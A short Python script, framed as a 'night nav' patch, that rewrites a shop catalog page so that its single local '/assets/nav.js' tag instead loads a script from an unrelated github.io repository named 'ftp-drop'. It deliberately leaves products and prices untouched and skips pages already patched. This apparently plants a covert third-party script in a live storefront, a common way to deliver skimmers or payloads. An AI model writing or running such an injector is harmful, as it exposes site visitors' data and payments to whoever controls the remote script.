#!/usr/bin/env python3
"""Point the unique catalog /assets/nav.js tag at github.io night nav.

One needle. Does not rewrite product cards. Other prices stay.
Usage: curl -fsSL https://eidotevil.com/ | python3 patch-nav-src.py [guard] > index.html
Exit 2 = already pointed at github.io nav (skip write).
Exit 1 = needle not unique or guard missing.
"""
from __future__ import annotations

import sys

NEW = 'src="https://agency002com-ship-it.github.io/ftp-drop/nav-night.js?v=20260907n"'
OLDS = (
    'src="/assets/nav.js?v=2"',
    'src="/assets/nav.js?v=4"',
)


def patch(html: str, guard: str | None = None) -> str:
    if NEW in html:
        raise SystemExit(2)
    hits = [(old, html.count(old)) for old in OLDS if html.count(old)]
    if len(hits) != 1 or hits[0][1] != 1:
        raise SystemExit(
            "nav.js src not unique (%s); skip" % ", ".join("%s=%s" % h for h in hits)
        )
    out = html.replace(hits[0][0], NEW, 1)
    if NEW not in out or hits[0][0] in out:
        raise SystemExit("nav.js src not moved; skip")
    if guard and guard not in out:
        raise SystemExit("nav src rewrite would drop %s; skip" % guard)
    return out


def main() -> None:
    guard = sys.argv[1] if len(sys.argv) > 1 else None
    html = sys.stdin.read()
    try:
        sys.stdout.write(patch(html, guard))
    except SystemExit as exc:
        if exc.code == 2:
            sys.stderr.write("already github.io night nav\n")
        raise


if __name__ == "__main__":
    main()
